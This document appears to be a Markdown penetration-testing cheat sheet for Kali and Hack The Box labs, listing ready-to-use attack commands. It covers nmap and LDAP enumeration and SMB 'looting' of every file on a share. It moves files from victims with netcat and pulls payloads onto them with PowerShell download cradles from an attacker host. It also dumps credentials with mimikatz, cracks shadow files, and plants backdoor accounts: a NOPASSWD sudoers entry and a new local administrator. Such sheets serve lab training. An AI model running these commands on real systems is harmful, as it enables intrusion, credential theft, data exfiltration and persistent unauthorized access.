# Commands

## Kali

+ ### Shortcuts

    > **SSH**: SSH with Clear Password

    ```pwsh
    sshpass -p <PASSWORD> ssh <RUSER>@<RHOST>
    ```

+ ### Enumerating

    > **NMap**: Top Scan (Fast)

    ```pwsh
    nmap -Pn -n -v -sV -sC <RHOST>
    ```

    > **NMap**: Full Scan with Firewall Protection (Slow)

    ```pwsh
    nmap -sT -sU -sV -O -T4 -A -Pn --open --max-retries 3 --max-scan-delay 1s --defeat-rst-ratelimit --script-args unsafe=1 -oN <LPATH> <RHOST>
    ```

    > **LDAP**: Full Enumerating

    ```pwsh
    ldapsearch -x -h <RHOST> -D '' -w '' -b "DC=domain,DC=local"
    ```

    > **DirSearch**: Web Enumerating

    ```pwsh
    dirsearch -u http://<RHOST>:<RPORT>/ -t 16 -r -e txt,html,php,asp,aspx,jsp -f -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --exclude-texts="<TEXT>"
     ```


+ ### Fuzzing

    > **WFuzz**: Fuzzing HTTP POST Data

    ```pwsh
    wfuzz -c -z file,<FUZZ-FILE> -v --hs "<BAD-TEXT>" -d "<PARAMETER>=FUZZ" "http://<RHOS>:<RPORT>/<RPATH>"
    ```

+ ### Remote Access

    > **Remote Desktop Connection**:

    ```pwsh
    rdesktop <RHOST> -r disk:share=<RPATH>
    ```

    > **PowerShell Core**:

    ```pwsh
    > New-PSSession -Credential (Get-Credential) -ComputerName <RHOST> -Authentication Negotiate
    > Enter-PSSession 1
    ```

+ ### Looting

    > **SMBClient**: Download All Files

    ```pwsh
    smbclient '\\<RHOST>\<RPATH>' -c 'prompt OFF;recurse ON;lcd '.';mget *' -U 'User'
    ```

+ ### Compiling

    > x64 Compile

    ```pwsh
    x86_64-w64-mingw32-gcc Source.c -o File.exe
    ```

    > x86 Compile

    ```pwsh
    i686-w64-mingw32-gcc Source.c -o File.exe -lws2_32
    ```

+ ### File Transfer

    > **SCP**: Secure Copy with SSH

    ```pwsh
    scp <LPATH> <RUSER>@<RHOST>:<RPATH>
    ```

    > **IPP**: From Victm (Linux) to Kali

    ```pwsh
    Vict$ /dev/shm/ipp <LHOST> <LPORT> < <FILE>
    KALI$ nc -lvnp <LPORT> > <FILE>
    ```

    > **FTP**: From Kali to Victim (Linux)

    ```pwsh
    KALI$ pyftp
    Vict> echo "open 127.0.0.1 21\nuser anonymous anonymous\nbin\ncd <PATH>\nget <FILE>\nbye" | ftp -inv
    ```

    > **FTP**: From Kali to Victim (Windows - PowerShell)

    ```pwsh
    KALI$ pyftp
    Vict> (New-Object Net.WebClient).DownloadFile('ftp://anonymous:anonymous@<KALI>:<KPORT>/<PATH>/<FILE>','<FILE>')
    ```

    > **FTP**: From Kali to Victim (Windows - CMD)

    ```pwsh
    KALI$ pyftp
    Vict> echo OPEN <KALI> <KPORT> > FTP.txt
    Vict> echo USER anonymous >> FTP.txt
    Vict> echo CD <FOLDER> >> FTP.txt
    Vict> echo BIN >> FTP.txt
    Vict> echo GET <FILE> >> FTP.txt
    Vict> ftp -v -n -s:ftp.txt
    ```

+ ### Pivoting

    > **SShuttle**: VPN-Like Network Access

    > **Note:** Server must have python 2.3 or higher.

    ```pwsh
    sshuttle -r <RUSER>@<RHOST>:<RPORT> <RSubnet>/24
    ```

    > Dynamic with SSH & ProxyChains

    ```pwsh
    > ssh -N -D 127.0.0.1:9040 <RUSER>@<RHOST>
    > export PROXYCHAINS_SOCKS4=9040
    > export PROXYCHAINS_SOCKS5=9050
    > proxychains nmap -Pn -n -sV -sC 127.0.0.1
    ```

    > Forward Static with SSH: Kali => Victim A => Victim B

    ```pwsh
    ssh -N -L 127.0.0.1:<LPORT>:<THOST>:<TPORT> <RUSER>@<RHOST>
    ```

    > Reverse Static with SSH: Kali <= Victim A

    > Note: Usefull with Low Privilage Shells

    ```pwsh
    ssh -N -R <KALI>:<LPORT>:127.0.0.1:<RPORT> <ROOT>@<KALI>
    ```

+ ### Password Cracking

    > Passwd & Shadow Files

    ```pwsh
    > unshadow passwd shadow > passwords.txt
    > john passwords.txt
    ```

    > Protected Zip Files

    ```pwsh
    > zip2john file.zip > password.txt
    > john passwords.txt
    ```

---

## Linux

+ ### Shell Helpers

    > Fixing PATH Enviroment Variable

    ```pwsh
    export PATH=$PATH:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin:/bin:/sbin
    ```

    > Fixing TTY

    ```pwsh
    > python -c 'import pty; pty.spawn("/bin/sh")'
    > python -c 'import pty; pty.spawn("/bin/bash")'
    ```

+ ### Process List

    > List Running Process

    ```pwsh
    > ps aux
    > ps aux | grep <PROCESS-NAME>
    ```

+ ### Liseners

    > List Liseners

    ```pwsh
    > ss -antp | grep <PORT>
    ```

+ ### Add Local Sudoer

    > Using Sudoers File

    ```pwsh
    > adduser Hacker --force-badname
    > passwd Hacker1
    > echo 'Hacker  ALL=(ALL:ALL) NOPASSWD:ALL' >> /etc/sudoers
    > su - Hacker
    > sudo bash
    ```

---

## Windows

+ ### Download File

    > Inside PowerShell

    ```pwsh
    > Invoke-WebRequest -URI http://<LHOST>/<LPATH> -OutFile <FILE>
    ```

    > Inside Command Line

    ```pwsh
    > powershell -Command "& { (New-Object Net.WebClient).DownloadFile('http://<LHOST>/<LPATH>','<FILE>') }"
    > powershell -Command "Invoke-WebRequest -URI http://<LHOST>/<LPATH> -OutFile <FILE>"

    ```

+ ### Windows Enumeration

    > Using Net.exe

    ```pwsh
    > net user
    > net group
    ```

    > Using Mimikatz

    ```pwsh
    > mimikatz "privilege::debug" "sekurlsa::logonpasswords" exit
    ```

+ ### Add Local Administrator

    > Using Net.exe

    ```pwsh
    > net user Hacker Hacker1 /add
    > net localgroup administrators Hacker /add
    ```

---

## Hack The Box

+ ### Refresh Flags

    > User.txt

    ```pwsh
    gci -path c:\ -Recurse -ErrorAction SilentlyContinue -include user.txt
    ```

    > Root.txt

    ```pwsh
    gci -path c:\ -Recurse -ErrorAction SilentlyContinue -include root.txt
    ```
